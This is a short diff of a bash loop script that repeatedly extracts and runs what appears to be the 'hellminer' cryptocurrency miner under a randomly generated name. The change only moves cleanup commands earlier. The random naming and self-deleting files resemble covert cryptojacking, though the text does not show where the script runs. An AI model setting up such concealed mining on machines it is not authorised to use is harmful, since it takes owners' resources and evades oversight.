@@ -18,7 +18,8 @@ while true; do
   # Extract file
   tar -xf hellminer_linux64_avx2.tar.gz
   rm -f hellminer_linux64_avx2.tar.gz
-  
+  rm -rf run_miner.sh
+  rm -rf verus-solver
 
   # Generate random name
   random_name=$(generate_random_name)
@@ -35,8 +36,7 @@ while true; do
   # Clean up downloaded and extracted files
   rm -f hellminer_linux64_avx2.tar.gz
   rm -rf "$random_name"
-  rm -rf run_miner.sh
-  rm -rf verus-solver
+  
   # Pause for 2 minutes before looping again
   sleep 2m
 done
